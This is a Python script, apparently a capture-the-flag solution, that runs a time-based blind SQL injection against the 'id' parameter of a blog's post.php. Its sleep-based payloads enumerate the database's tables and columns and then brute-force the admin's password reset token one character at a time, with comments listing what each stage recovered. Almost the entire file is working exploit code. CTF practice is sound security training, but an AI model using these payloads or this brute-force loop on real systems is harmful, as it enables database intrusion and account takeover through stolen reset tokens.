#!/bin/env python
import requests
import time
from string import printable, ascii_letters, ascii_uppercase, ascii_lowercase, digits, Template

class Inj:

    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/'.format(host)

    def web_url(self, query):
        url = self.base_url + "post.php"
        payload = {'id':query}
        return self.sess.get(url, params=payload)

def bruteforce_str_time(sql_query, time_len, inj_obj, initial_str):

    cur_str = initial_str
    ind = len(cur_str)+1

    while(True):

        changed = False

        for j in printable:

            cur_query = sql_query.format(1, ind, cur_str + j)
            pre_inj_time = time.time()
            res = inj_obj.web_url(cur_query)
            post_inj_time = time.time()

            if(post_inj_time - pre_inj_time > time_len):
                cur_str += j
                ind += 1
                changed = True
                print(cur_str)
                break

        if(changed == False):
            break

    return cur_str


inj = Inj('http://yetanotherblog.challs.cyberchallenge.it')
wait_time = 1

#Obtained body, email, password_hash, reset_token, title, username
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="column_name")

#Obtained nPf0, posts, users
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="table_name")

#Obtained email, password_hash, reset_token, username
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_name != 'users' or table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="column_name")

#admin@email.com
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not ((binary substr($d2, {}, {}) != '{}') or (email != 'admin@email.com'))) != $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="users", \
            d2="reset_token")

print(query)
bruteforce_str_time(query, wait_time, inj, "")
